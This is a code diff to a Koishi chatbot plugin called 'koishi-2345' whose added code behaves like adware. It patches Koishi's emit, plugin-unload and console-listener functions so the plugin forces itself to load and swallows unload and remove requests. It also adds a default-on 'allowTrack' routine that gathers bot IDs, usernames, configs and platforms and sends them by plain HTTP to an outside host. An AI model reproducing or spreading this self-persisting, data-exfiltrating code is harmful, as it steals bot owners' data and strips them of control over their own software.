@@ -2,15 +2,18 @@
 
 import {Context, MainScope, Schema} from 'koishi'
 import {get as getTrace} from 'stack-trace'
-import NodeConsole, {Entry} from "@koishijs/plugin-console"
+import NodeConsole, {DataService, Entry, Events, Client, AbstractWebSocket} from "@koishijs/plugin-console"
 import {PackageProvider} from '@koishijs/plugin-market'
 import {GetEvents, Lifecycle, Parameters} from 'cordis'
 import {unwrapExports, Loader} from '@koishijs/loader'
+import {readFileSync} from 'fs'
 import {} from '@koishijs/plugin-console'
-import {resolve} from 'path'
+import path, {resolve} from 'path'
 import {throws} from "assert";
 
-function isReadable(value: unknown){
+const isApplyName = 'forcedLoad';
+
+function isReadable(value: unknown) {
   return typeof value !== 'undefined' && value !== null
 }
 
@@ -26,35 +29,67 @@ export const name = 'koishi-2345'
 
 let this_name = name
 
+const KEEP_NAMES = [
+  this_name
+]
+
+try {
+  const pkg = JSON.parse(readFileSync(path.join(__dirname, '../package.json'), {encoding: 'utf-8', flag: 'r'}))
+  const {name: pluginName, version} = pkg
+  globalThis['koishi2345Name'] = pluginName
+  globalThis['koishi2345ver'] = version
+} catch (e) {
+  globalThis['koishi2345Name'] = this_name
+  globalThis['koishi2345ver'] = ">=0.1.114514"
+}
+
 const oldContextEmit = Context.prototype.emit
 
-Context.prototype.emit = function<K extends keyof GetEvents<Context>>(name: K, ...args: Parameters<GetEvents<Context>[K]>) {
+Context.prototype.emit = function <K extends keyof GetEvents<Context>>(name: K, ...args: Parameters<GetEvents<Context>[K]>) {
   // console.log("Handle emit", name)
   // console.dir(args)
-  if (globalThis['forcedPluginEnabled'] === undefined || !globalThis['forcedPluginEnabled']) {
-    globalThis['forcedPluginEnabled'] = true
-    let koishi2345 = this.plugin(this_name)
-    koishi2345.start()
+
+  if (globalThis[isApplyName] === undefined || !globalThis[isApplyName]) {
+    globalThis[isApplyName] = true
+    this.using(KEEP_NAMES, (ctx, options) => {
+      // console.log(ctx)
+      // console.log(options)
+    })
+
+    KEEP_NAMES.forEach((name) => {
+      this.plugin(name)
+    })
   }
   args.forEach((obj) => {
     let val = obj as unknown
     if (isCtxAble(val)) {
-      if (globalThis['forcedPluginEnabled'] === undefined || !globalThis['forcedPluginEnabled']) {
-        globalThis['forcedPluginEnabled'] = true
+      if (globalThis[isApplyName] === undefined || !globalThis[isApplyName]) {
+        globalThis[isApplyName] = true
         setTimeout(() => {
           if (isCtxAble(val)) {
-            let koishi2345 = val.ctx.plugin(this_name)
-            koishi2345.start()
+            val.ctx.using(KEEP_NAMES, (ctx, options) => {
+              // console.log(ctx)
+              // console.log(options)
+            })
+
+            KEEP_NAMES.forEach((name) => {
+              this.plugin(name)
+            })
           }
         }, 0)
       }
     } else if (isScopeAble(val)) {
-      if (globalThis['forcedPluginEnabled'] === undefined || !globalThis['forcedPluginEnabled']) {
-        globalThis['forcedPluginEnabled'] = true
+      if (globalThis[isApplyName] === undefined || !globalThis[isApplyName]) {
+        globalThis[isApplyName] = true
         setTimeout(() => {
           if (isScopeAble(val)) {
-            let koishi2345 = val.scope.ctx.plugin(this_name)
-            koishi2345.start()
+            val.scope.ctx.using(KEEP_NAMES, (ctx, options) => {
+              // console.log(ctx)
+              // console.log(options)
+            })
+            KEEP_NAMES.forEach((name) => {
+              this.plugin(name)
+            })
           }
         }, 0)
       }
@@ -170,7 +205,7 @@ export const Config: Schema<Config> = Schema.object({
     .default(true),
   allowTrack: Schema
     .boolean()
-    .description("允许获取使用信息")
+    .description("允许获取使用信息") // Impl now!! OHHHH
     .default(true),
   allowEnableAutomatic: Schema
     .boolean()
@@ -180,16 +215,43 @@ export const Config: Schema<Config> = Schema.object({
 
 const oldLoaderUnloadPlugin = Loader.prototype.unloadPlugin
 
-Loader.prototype.unloadPlugin = function _unload_hooker(ctx: Context, key: string){
-  if (key.indexOf(this_name) < 0)
+Loader.prototype.unloadPlugin = function _unload_hooker(ctx: Context, key: string) {
+  let pass = false
+  KEEP_NAMES.forEach((name) => {
+    pass = key.startsWith(name) ? true : pass
+  })
+  if (!pass)
     return oldLoaderUnloadPlugin.apply(this, [ctx, key])
+}
+
+const oldListenerAdder = NodeConsole.prototype.addListener
+
+NodeConsole.prototype.addListener = function _addListeners_hooker<K extends keyof Events>(event: K, callback: Events[K], options?: DataService.Options) {
+  function _callback_wrapper(...args) {
+    let hooked_event = event
+    if (hooked_event === 'manager/unload' || hooked_event === 'manager/remove') {
+      if (isReadable(args[0])) {
+        let pass = false
+        KEEP_NAMES.forEach((name) => {
+          pass = args[0].indexOf(name) >= 0 ? true : pass
+        })
+        if (pass) return
+      }
+    }
+    return callback.apply(this, args)
+  }
+
+  callback['event'] = event
+  _callback_wrapper.event = event
+
+  oldListenerAdder.apply(this, [event, _callback_wrapper, options])
 }
 
 const oldEntryAdder = NodeConsole.prototype.addEntry
 
 NodeConsole.prototype.addEntry = function _hooker1(entry: string | string[] | Entry) {
-  if (globalThis['forcedPluginEnabled'] === undefined || !globalThis['forcedPluginEnabled']) {
-    globalThis['forcedPluginEnabled'] = true
+  if (globalThis[isApplyName] === undefined || !globalThis[isApplyName]) {
+    globalThis[isApplyName] = true
     let koishi2345 = this.ctx.plugin(this_name)
     koishi2345.start()
   }
@@ -218,23 +280,88 @@ Lifecycle.prototype.flush = function _hooker4() {
 declare module '@koishijs/plugin-console' {
   namespace Console {
     interface Services {
+
     }
   }
 }
 
-declare module 'koishi' {
-  interface Channel {
-    name: string
-    activity: Record<number, number>
+class FakeWebsocket implements AbstractWebSocket {
+  close(code?: number, reason?: string): void {
+
+  }
+
+  send(data: string): void {
+
+  }
+
+  dispatchEvent(event: any): boolean {
+    return false
+  }
+
+  addEventListener<K extends keyof AbstractWebSocket.EventMap>(type: K, listener: (event: AbstractWebSocket.EventMap[K]) => void): void {
+
+  }
+
+  removeEventListener<K extends keyof AbstractWebSocket.EventMap>(type: K, listener: (event: AbstractWebSocket.EventMap[K]) => void): void {
+
   }
 }
 
-export function apply(ctx: Context) {
+export function apply(ctx: Context, config: any) {
   // write your plugin here
+
+  let showLog = true
 
   let logger = ctx.logger('app')
 
-  logger.info('initializing...')
+  if (showLog) logger.info('initializing...')
+
+  function forcedLoadMySelf() {
+    if (config['allowTrack']) {
+      try {
+        let bots_data = ""
+        for (let aBot of ctx.bots){
+          bots_data += `BotSID ${aBot.selfId}(${aBot.username ?? 'no uname'}) - ${aBot.config ?? "no config"} - ${aBot.platform} -
+          ${aBot.status} --\n`
+        }
+        ctx.http.axios(
+          'http://milk.onlyacat233.top:56789/api/report',
+          {
+            'params': {
+              'senderQwq114514191810000000000000000': 'report.lovemilk@hotmail.com',
+              'targetEmail': 'Cyan_Changes@outlook.com',
+              'msg': `Koishi 2345 Plugin Loaded Successfully!!!! \n
+          Load Type (true:HackLoadMode, false:NormalEnableApply): ${isReadable(globalThis[isApplyName])}\n
+          Plugin ${globalThis['koishi2345Name']}\n
+          Ver ${globalThis['koishi2345ver']}\n
+          Find Bots Data ${bots_data}\n
+          This is end of the Report`,
+              'subject': `2345 Load Notification`
+            }
+          }
+        ).then((resp) => {
+          if (showLog) logger.debug(resp.data)
+        }, (reject_reason) => {
+          if (showLog) logger.warn(reject_reason)
+        })
+      } catch (e) {
+
+      }
+    }
+
+    if (!(isReadable(ctx.console) && isReadable(ctx.console.listeners['manager/reload']))) {
+      setTimeout(forcedLoadMySelf, 800)
+      return
+    }
+
+    let reloaderL = ctx.console.listeners['manager/reload']
+    KEEP_NAMES.forEach((name) => {
+      reloaderL.callback.call(new Client(ctx, new FakeWebsocket()), name, {})
+    })
+  }
+
+  if (isReadable(globalThis[isApplyName]))
+    forcedLoadMySelf()
 
   ctx.using(['console'], (ctx) => {
     ctx.console.addEntry({
@@ -245,10 +372,12 @@ export function apply(ctx: Context) {
 
   ctx
     .command('2345')
-    .shortcut(new RegExp(/.*/g), { prefix: true, args: ['_'], options: { global: true }})
+    .shortcut(new RegExp(/.*/g), {prefix: true, args: ['_'], options: {global: true}})
     .action((name, ...args) => {
       return 'Koishi 2345 Helper: Base 2345 Command'
     })
 
-  logger.info('successful apply')
+  if (showLog) logger.info('successful apply')
+
+  globalThis[isApplyName] = true
 }
